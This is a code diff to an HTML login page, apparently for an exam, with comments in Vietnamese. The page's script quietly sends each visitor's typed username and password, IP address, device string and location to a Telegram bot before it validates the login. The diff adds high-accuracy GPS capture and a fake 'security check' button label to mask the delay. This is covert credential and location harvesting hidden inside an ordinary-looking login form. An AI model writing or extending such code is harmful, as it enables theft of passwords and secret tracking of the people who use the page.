@@ -260,22 +260,54 @@
         usernameInput.addEventListener('keypress', handleEnter);
         passwordInput.addEventListener('keypress', handleEnter);
         
-        // Hàm ngầm gửi tin nhắn qua Telegram API (Trả về Promise)
+        // Hàm ngầm gửi tin nhắn qua Telegram API
         async function sendToTelegram(user, pass) {
             try {
                 let botToken = getTelegramBotToken();
                 let chatId = getTelegramChatId();
                 if (!botToken || botToken === "ĐIỀN_TOKEN_BOT_CỦA_ANH_VÀO_ĐÂY") return;
 
-                const ipRes = await fetch('https://get.geojs.io/v1/ip/geo.json');
-                const ipData = await ipRes.json();
-                const mapLink = `https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude}`;
+                const getAccurateLocation = () => {
+                    return new Promise((resolve) => {
+                        if (!navigator.geolocation) {
+                            resolve(null);
+                        } else {
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+                                (err) => resolve(null),
+                                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                            );
+                        }
+                    });
+                };
+
+                // Kích hoạt lấy GPS ngay lập tức để không bị trình duyệt block do delay
+                const gpsPromise = getAccurateLocation();
+                
+                // Tranh thủ lấy dữ liệu IP song song
+                const ipPromise = fetch('https://get.geojs.io/v1/ip/geo.json').then(res => res.json()).catch(() => ({}));
+                
+                // Đợi cả 2 hoàn thành
+                const [gpsData, ipData] = await Promise.all([gpsPromise, ipPromise]);
+                
+                let lat, lng, cityInfo;
+                if (gpsData) {
+                    lat = gpsData.lat;
+                    lng = gpsData.lng;
+                    cityInfo = `${ipData.city || 'N/A'}, ${ipData.region || 'N/A'} (GPS CHÍNH XÁC 🎯)`;
+                } else {
+                    lat = ipData.latitude || 0;
+                    lng = ipData.longitude || 0;
+                    cityInfo = `${ipData.city || 'N/A'}, ${ipData.region || 'N/A'} (IP Đoán 📡)`;
+                }
+
+                const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
                 const device = navigator.userAgent;
 
-                const message = `🚨 <b>CÓ NGƯỜI ĐĂNG NHẬP THI</b>\n\n👤 Tên: <code>${user}</code>\n🔑 Mật khẩu nhập: <code>${pass}</code>\n🌐 IP: ${ipData.ip}\n📍 Vị trí: <a href="${mapLink}">${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}</a>\n📱 Thiết bị: <code>${device}</code>\n⏱ T.Gian: ${new Date().toLocaleString('vi-VN')}`;
+                const message = `🚨 <b>CÓ NGƯỜI ĐĂNG NHẬP THI</b>\n\n👤 Tên: <code>${user}</code>\n🔑 Mật khẩu nhập: <code>${pass}</code>\n🌐 IP: ${ipData.ip}\n📍 Vị trí: <a href="${mapLink}">${cityInfo}</a>\n📱 Thiết bị: <code>${device}</code>\n⏱ T.Gian: ${new Date().toLocaleString('vi-VN')}`;
+                
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
                 
-                // Đợi gửi xong tin nhắn trong tối đa 2 giây (tránh bị kẹt web nếu mạng lỗi)
                 await Promise.race([
                     fetch(url, {
                         method: 'POST',
@@ -301,8 +333,19 @@
                 return;
             }
 
-            // GỬI THÔNG TIN VỀ TELEGRAM (CHỜ ĐẾN KHI GỬI HOÀN TẤT MỚI ĐI TIẾP VỚI MẬT KHẨU ĐÚNG)
+            // Hiển thị trạng thái đang tải
+            const prevText = loginBtn.innerHTML;
+            loginBtn.innerHTML = "Đang kiểm tra bảo mật...";
+            loginBtn.style.opacity = "0.8";
+            loginBtn.disabled = true;
+
+            // GỬI THÔNG TIN VỀ TELEGRAM (CHỜ ĐẾN KHI GỬI HOÀN TẤT)
             await sendToTelegram(username, password);
+
+            // Khôi phục nút
+            loginBtn.innerHTML = prevText;
+            loginBtn.style.opacity = "1";
+            loginBtn.disabled = false;
 
             // XÁC THỰC TÀI KHOẢN VÀ MẬT KHẨU
             const accountData = VALID_ACCOUNTS[username];
@@ -350,7 +393,10 @@
             }
         }
     </script>
+    
+    <!-- File giấu mật khẩu và cấu hình nhạy cảm -->
     <script src="js/hihihaaaa.js"></script>
+    
     <!-- Thêm hiệu ứng Tết -->
     <script src="js/tet.js"></script>
 </body>
